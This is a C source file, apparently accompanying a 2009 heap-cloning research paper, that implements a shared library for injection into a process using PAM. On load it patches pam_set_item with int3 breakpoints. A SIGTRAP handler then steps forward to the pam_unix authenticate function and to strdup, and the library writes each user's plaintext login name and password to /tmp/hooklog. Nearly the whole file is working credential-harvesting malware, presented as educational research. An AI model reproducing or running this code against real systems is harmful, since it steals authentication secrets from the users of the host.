/*
 * Copyright (C) 2007-2025 Sebastian Krahmer
 * All rights reserved.
 *
 * This is NOT a common BSD license, so read on.
 *
 * Redistribution in source (but not in binary forms), with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. The provided software is FOR EDUCATIONAL PURPOSES ONLY! You must not
 *    use this software or parts of it to commit crime or any illegal
 *    activities. Local law may forbid usage or redistribution of this
 *    software in your country.
 * 2. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 3. Redistribution in binary form is not allowed.
 * 4. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Sebastian Krahmer.
 * 5. The name Sebastian Krahmer may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/* This code is part of the 'Adventures in Heap Cloning' research paper.
 * If you find this code without the paper, search for
 * SET-heap-cloning-2009 on the web.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <security/pam_modules.h>
#include <link.h>
#include <ucontext.h>
#include <elf.h>
#include <sys/time.h>

// original bytes which we substitute by int3
static unsigned char orig[0x10];

// the functions which have been hooked
static unsigned char *hooks[0x10] = {0, 0};

static char *user = NULL;
static FILE *flog = NULL;

typedef enum { PAM_FALSE, PAM_TRUE } pam_boolean;

// all the PAM declarations must match EXACTLY the targets
// PAM version and structs. Otherwise, walking the pam
// handler lists etc. is likely to produce SIGSEGV
struct handler {
	int handler_type_must_fail;
	int (*func)(void *pamh, int flags, int argc, char **argv);
	int actions[32];
	/* set by authenticate, open_session, chauthtok(1st)
	 consumed by setcred, close_session, chauthtok(2nd) */
	int cached_retval; int *cached_retval_p;
	int argc;
	char **argv;
	struct handler *next;
	char *mod_name;
	int stack_level;
};

struct handlers {
	struct handler *authenticate;
	struct handler *setcred;
	struct handler *acct_mgmt;
	struct handler *open_session;
	struct handler *close_session;
	struct handler *chauthtok;
};

struct pam_handle {
	char *authtok;
	unsigned caller_is;
	void *pam_conversation;
	char *oldauthtok;
	char *prompt;
	char *service_name;
	char *user;
	char *rhost;
	char *ruser;
	char *tty;
	char *xdisplay;
	void *data, *env;
	struct {
		pam_boolean set;
		unsigned int delay;
		time_t begin;
		void *delay_fn_ptr;
	} fail_delay;
	struct {
		int namelen;
		char *name;
		int datalen;
		char *data;
	} xauth;
	struct {
		void *loaded_module;
		int modules_allocated;
		int modules_used;
		int handlers_loaded;
		struct handlers conf;
		struct handlers other;
	} handlers;
};


static void sigtrap(int x, siginfo_t *si, void *vp)
{
	ucontext_t *uc = vp;
	void *arg = NULL;
	struct pam_handle *ph = NULL;
	struct handler *mod = NULL;
	unsigned char *aligned = NULL;

#ifdef __x86_64__
	greg_t ip = uc->uc_mcontext.gregs[REG_RIP];
	arg = (void *)uc->uc_mcontext.gregs[REG_RDI];
#else
	// x86 is not working, I just show it to give an idea
	greg_t ip = uc->uc_mcontext.gregs[REG_EIP];
#endif
	fprintf(flog, "TRAP@ %zx\n", ip);

	// this is a finite state machine (FSM), we trap ourself forward
	// until we reach the final strdup() for the password
	// If the FSM is left, all hooks are cleaned up in target process
	// since the last state does not define new hooks
	if (ip - 1 == (greg_t)hooks[0]) {
		// restore original context
		hooks[0][0] = orig[0];
		uc->uc_mcontext.gregs[REG_RIP] = (greg_t)hooks[0];

		ph = (struct pam_handle *)arg;
		mod = ph->handlers.conf.authenticate;
		do {
			fprintf(flog, "TRAP1: loaded PAM modules: %s\n", mod->mod_name);
			if (strstr(mod->mod_name, "pam_unix"))
				break;
		} while ((mod = mod->next) != NULL);

		// hook pam authenticate function
		if (mod != NULL) {
			hooks[1] = (unsigned char *)mod->func;
			aligned = (unsigned char *)(((size_t)hooks[1]) & ~4095);
			if (mprotect(aligned, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) == 0) {
				orig[1] = hooks[1][0];
				hooks[1][0] = 0xcc;
			}
		}
	} else if (ip - 1 == (greg_t)hooks[1]) {
		// restore original context
		hooks[1][0] = orig[1];
		uc->uc_mcontext.gregs[REG_RIP] = (greg_t)hooks[1];

		ph = (struct pam_handle *)arg;
		fprintf(flog, "TRAP2: hooking strdup() user=%s\n", ph->user);
		user = strdup(ph->user);
		// carefull to only hook after we used strdup() ourself
		hooks[2] = dlsym(NULL, "strdup");
		if (!hooks[2])
			return;
		aligned = (unsigned char *)(((size_t)hooks[2]) & ~4095);
		if (mprotect(aligned, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) == 0) {
			orig[2] = hooks[2][0];
			hooks[2][0] = 0xcc;
		}
	} else if (ip - 1 == (greg_t)hooks[2]) {
		// restore ...
		hooks[2][0] = orig[2];
		uc->uc_mcontext.gregs[REG_RIP] = (greg_t)hooks[2];

		fprintf(flog, "TRAP3: credentials: user=%s pwd=%s\n", user, (char *)arg);
	}

	return;
}


void _init()
{
	unsigned char *aligned = NULL;
	struct sigaction sa;

	if ((hooks[0] = dlsym(NULL, "pam_set_item")) == NULL)
		return;

	flog = fopen("/tmp/hooklog", "a");
	if (!flog)
		return;

	setbuffer(flog, NULL, 0);

	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = sigtrap;
	sa.sa_flags = SA_RESTART|SA_SIGINFO;
	sigaction(SIGTRAP, &sa, NULL);

	aligned = (unsigned char *)(((size_t)hooks[0]) & ~4095);
	if (mprotect(aligned, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) != 0)
		return;

	fprintf(flog, "initial hooking: pid=%d addr=%p ", getpid(), hooks[0]);

	orig[0] = hooks[0][0];
	hooks[0][0] = 0xcc;

	fprintf(flog, "done\n");
	return;
}

